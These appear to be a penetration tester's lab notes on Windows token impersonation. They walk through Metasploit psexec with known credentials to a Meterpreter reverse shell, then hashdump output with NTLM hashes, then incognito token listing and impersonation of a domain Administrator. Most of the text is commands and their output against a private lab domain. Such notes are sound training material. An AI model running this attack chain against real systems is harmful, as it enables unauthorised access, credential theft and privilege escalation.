# Token Impersonation

- Launch Metasploit `msfconsole`
- Choose the exploit: `use exploit/windows/smb/psexec`
- Set: rhosts, smbdomain, smbpass, smbuser, target (we can use `show targets` to have a list), payload
- Launch the attack: `run`
- We get a shell:
  ```
  msf6 exploit(windows/smb/psexec) > run

  [*] Started reverse TCP handler on 10.0.2.8:4444 
  [*] 10.0.2.15:445 - Connecting to the server...
  [*] 10.0.2.15:445 - Authenticating to 10.0.2.15:445|marvel.local as user 'fcastle'...
  [!] 10.0.2.15:445 - peer_native_os is only available with SMB1 (current version: SMB3)
  [*] 10.0.2.15:445 - Uploading payload... oeyrkyrs.exe
  [*] 10.0.2.15:445 - Created \oeyrkyrs.exe...
  [*] Sending stage (200262 bytes) to 10.0.2.15
  [+] 10.0.2.15:445 - Service started successfully...
  [*] 10.0.2.15:445 - Deleting \oeyrkyrs.exe...
  [*] Meterpreter session 1 opened (10.0.2.8:4444 -> 10.0.2.15:61871 ) at 2022-02-11 13:49:12 -0500

  meterpreter > 
  ```
- Getting hashes: `hashdump`
  ```
  meterpreter > hashdump
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  Frank Castle:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e6cedee56d27d175f48042b53cb6b242:::
  ```
- Use tools: `load` (double tab to get the list of tools)
- `load incognito`
  ```
  Incognito Commands
  ==================

      Command              Description
      -------              -----------
      add_group_user       Attempt to add a user to a global group with all tokens
      add_localgroup_user  Attempt to add a user to a local group with all tokens
      add_user             Attempt to add a user with all tokens
      impersonate_token    Impersonate specified token
      list_tokens          List tokens available under current user context
      snarf_hashes         Snarf challenge/response hashes for every token
  ```
- list_tokens -u
  ```
  meterpreter > list_tokens -u

  Delegation Tokens Available
  ========================================
  Font Driver Host\UMFD-0
  Font Driver Host\UMFD-1
  Font Driver Host\UMFD-2
  MARVEL\Administrator
  MARVEL\fcastle
  NT AUTHORITY\LOCAL SERVICE
  NT AUTHORITY\NETWORK SERVICE
  NT AUTHORITY\SYSTEM
  Window Manager\DWM-1
  Window Manager\DWM-2

  Impersonation Tokens Available
  ========================================
  No tokens available
  ```
- Impersonate Administrator: 
  ```
  meterpreter > impersonate_token marvel\\administrator
  [+] Delegation token available
  [+] Successfully impersonated user MARVEL\Administrator
  meterpreter > shell
  Process 8576 created.
  Channel 1 created.
  Microsoft Windows [Version 10.0.19044.1288]
  (c) Microsoft Corporation. All rights reserved.
  C:\Windows\system32>whoami
  whoami
  marvel\administrator
  ```
- If we hashdump again it will not work so we can rev2self to get back to the initial user
- Any user that has logged in the target will have a token there until the target reboots
